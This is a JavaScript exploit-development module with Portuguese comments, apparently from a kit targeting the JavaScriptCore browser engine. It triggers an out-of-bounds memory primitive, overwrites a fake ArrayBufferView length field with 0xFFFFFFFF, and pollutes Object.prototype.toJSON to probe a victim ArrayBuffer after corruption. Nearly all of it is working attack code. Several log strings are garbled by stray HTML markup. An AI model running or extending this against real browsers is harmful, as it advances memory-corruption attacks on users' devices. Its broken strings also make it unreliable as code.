// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

// ============================================================
// DEFINIÇÕES DE CONSTANTES E VARIÁVEIS GLOBAIS
// ============================================================
const FNAME_MAIN = "ExploitLogic_v25_MinimalVictimProbe_FixConst"; // Nova versão com correção

// Constantes para a estrutura fake (mesmo que não seja totalmente usada, o offset é referenciado)
const FAKE_VIEW_BASE_OFFSET_IN_OOB    = 0x58; // CONSTANTE QUE FALTAVA NO ESCOPO
const FAKE_VIEW_MLENGTH_INITIAL_PLANT = 0x100; 

// Constante para a corrupção OOB
const CRITICAL_OOB_WRITE_VALUE  = 0xFFFFFFFF; 
const VICTIM_AB_SIZE = 64;

let minimal_probe_results_v25 = null; // Renomeado para evitar conflito se outro módulo usar nome similar

// ============================================================
// FUNÇÃO toJSON Poluída Ultra-Minimalista
// ============================================================
function toJSON_MinimalProbeOnVictim_v25() { // Renomeado para v25
    const FNAME_toJSON = "toJSON_MinimalProbeOnVictim_v25";
    minimal_probe_results_v25 = {
        probe_called: true,
        this_type: "N/A_before_call",
        error: null
    };
    try {
        minimal_probe_results_v25.this_type = Object.prototype.toString.call(this); 
    } catch (e) {
        minimal_probe_results_v25.error = `${e.name}: ${e.message}`;
    }
    return minimal_probe_results_v25; 
}

// ============================================================
// FUNÇÃO PRINCIPAL
// ============================================================
export async function sprayAndInvestigateObjectExposure() { 
    const FNAME_CURRENT_TEST = `${FNAME_MAIN}.minimalVictimProbe`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Sondagem Mínima em victim_ab Pós-Corrupção (FixConst) ---`, "test", FNAME_CURRENT_TEST);
    document.title = `MinimalVictimProbe v25_FixConst`;

    minimal_probe_results_v25 = null;
    let errorCaptured = null;
    let stringifyResult = null;
    let potentiallyCrashed = true; 
    let stepReached = "init";

    // Calcular o offset de corrupção crítico usando M_LENGTH_OFFSET da ArrayBufferView
    // Se JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET for "0x24", corruptionTargetOffset será 0x7C.
    // Se for "0x18", corruptionTargetOffset será 0x70.
    const mLengthOffsetFromConfig = parseInt(JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET, 16);
    if (isNaN(mLengthOffsetFromConfig)) {
        logS3("ERRO CRÍTICO: JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET não é um número válido em config.mjs.", "critical", FNAME_CURRENT_TEST);
        return { errorOccurred: new Error("Invalid M_LENGTH_OFFSET in config"), potentiallyCrashed: false, stringifyResult: null, getter_probe_details: null };
    }
    const corruptionTargetOffset = FAKE_VIEW_BASE_OFFSET_IN_OOB + mLengthOffsetFromConfig; 
    logS3(`   Offset de escrita crítica calculado: ${toHex(corruptionTargetOffset)} (FAKE_VIEW_BASE_OFFSET_IN_OOB 0x58 + M_LENGTH_OFFSET ${toHex(mLengthOffsetFromConfig)})`, "info", FNAME_CURRENT_TEST);


    try {
        stepReached = "oob_setup";
        await triggerOOB_primitive();
        if (!oob_array_buffer_real) { throw new Error("OOB Init falhou."); }
        logS3("Ambiente OOB inicializado.", "info", FNAME_CURRENT_TEST);

        // PASSO 1 (Opcional): Plantar um valor inicial no local que será sobrescrito
        // Isso simula a plantação da estrutura fake, especificamente o campo m_length.
        const initial_value_at_target_offset = 0x100; // Um valor "seguro"
        oob_write_absolute(corruptionTargetOffset, initial_value_at_target_offset, 4);
        logS3(`PASSO 1: Valor inicial <span class="math-inline">\{toHex\(initial\_value\_at\_target\_offset\)\} escrito em oob\_ab\[</span>{toHex(corruptionTargetOffset)}] (local do m_length da estrutura fake).`, "info", FNAME_CURRENT_TEST);

        // PASSO 2: Escrita OOB CRÍTICA em oob_array_buffer_real
        stepReached = "critical_oob_write";
        logS3(`PASSO 2: Escrevendo valor CRÍTICO <span class="math-inline">\{toHex\(CRITICAL\_OOB\_WRITE\_VALUE\)\} em oob\_array\_buffer\_real\[</span>{toHex(corruptionTargetOffset)}]...`, "warn", FNAME_CURRENT_TEST);
        oob_write_absolute(corruptionTargetOffset, CRITICAL_OOB_WRITE_VALUE, 4); // Escreve 0xFFFFFFFF
        logS3(`  Escrita crítica em ${toHex(corruptionTargetOffset)} realizada.`, "info", FNAME_CURRENT_TEST);

        await PAUSE_S3(50);

        // PASSO 3: Criar victim_ab e tentar JSON.stringify com toJSON poluído
        stepReached = "victim_creation";
        let victim_ab = new ArrayBuffer(VICTIM_AB_SIZE);
        logS3(`PASSO 3: victim_ab (${VICTIM_AB_SIZE} bytes) criado. Tentando JSON.stringify(victim_ab) com ${toJSON_MinimalProbeOnVictim_v25.name}...`, "test", FNAME_CURRENT_TEST);

        const ppKey = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        let pollutionApplied = false;

        try {
            stepReached = "pp_pollution";
            Object.defineProperty(Object.prototype, ppKey, {
                value: toJSON_MinimalProbeOnVictim_v25,
                writable: true, configurable: true, enumerable: false
            });
            pollutionApplied = true;
            logS3(`  Object.prototype.${ppKey} poluído com ${toJSON_MinimalProbeOnVictim_v25.name}.`, "info", FNAME_CURRENT_TEST);

            stepReached = "before_stringify_victim";
            logS3(`  Chamando JSON.stringify(victim_ab)...`, "info", FNAME_CURRENT_TEST);
            stringifyResult = JSON.stringify(victim_ab); 
            potentiallyCrashed = false; 

            logS3(`  JSON.stringify(victim_ab) completou. Resultado da toJSON: ${stringifyResult ? JSON.stringify(stringifyResult) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);

            if (stringifyResult && stringifyResult.error) {
                logS3(`    ERRO DENTRO da ${toJSON_MinimalProbeOnVictim_v25.name}: ${stringifyResult.error}`, "error", FNAME_CURRENT_TEST);
                errorCaptured = new Error(`toJSON error: ${stringifyResult.error}`); 
            } else if (stringifyResult && stringifyResult.probe_called) {
                logS3(`    ${toJSON_MinimalProbeOnVictim_v25.name} foi chamada. Tipo de 'this': ${stringifyResult.this_type}`, "good", FNAME_CURRENT_TEST);
            }

        } catch (e_stringify) {
            errorCaptured = e_stringify;
            potentiallyCrashed = false;
            stepReached = "error_in_stringify";
            logS3(`  ERRO CRÍTICO durante JSON.stringify(victim_ab): ${e_stringify.name} - ${e_stringify.message}`, "critical", FNAME_CURRENT_TEST);
            document.title = `MinimalProbe CRASH: ${e_stringify.name}`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
                else delete Object.prototype[ppKey];
            }
        }

    } catch (e_main) {
        errorCaptured = e_main;
        potentiallyCrashed = false; 
        logS3(`ERRO CRÍTICO GERAL: ${e_main.name} - ${e_main.message}`, "critical", FNAME_CURRENT_TEST);
        if (e_main.stack) logS3(`Stack: ${e_main.stack}`, "critical", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MAIN} FALHOU: ${e_main.name}`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} (Último passo: ${stepReached}) Concluído ---`, "test", FNAME_CURRENT_TEST);
    }
    return { errorOccurred: errorCaptured, potentiallyCrashed, stringifyResult, getter_probe_details: minimal_probe_results_v25 };
}
